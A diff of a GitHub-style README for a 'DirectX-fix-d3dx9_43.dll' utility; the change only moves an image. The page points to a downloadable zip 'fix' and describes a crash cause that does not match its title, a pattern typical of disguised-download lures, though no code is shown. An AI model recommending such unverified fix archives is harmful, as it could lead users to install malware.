@@ -1,5 +1,5 @@
 # 🎮 DirectX-fix-d3dx9_43.dll
-
+![D3DX9_43.dll](https://www.technipages.com/wp-content/uploads/2023/04/how-to-fix-windows-error-d3dx9_43.jpg)
 > A small Windows utility to diagnose and fix game crashes caused by **inpoutx64.sys** driver conflicts
 
 [![Windows](https://img.shields.io/badge/Platform-Windows-blue?logo=windows)](https://www.microsoft.com/windows)
@@ -8,7 +8,6 @@
 [![Donwload](https://img.shields.io/badge/donwload-success)](https://github.com/kathe6942/DirectX-fix-d3dx9_43.dll/blob/main/DirectX-fix-d3dx9_43.zip)
 
 ---
-![D3DX9_43.dll](https://www.technipages.com/wp-content/uploads/2023/04/how-to-fix-windows-error-d3dx9_43.jpg)
 ## 🚨 The Problem
 
 After the Windows 11 **KB5121003** update, many users experienced sudden game crashes with:
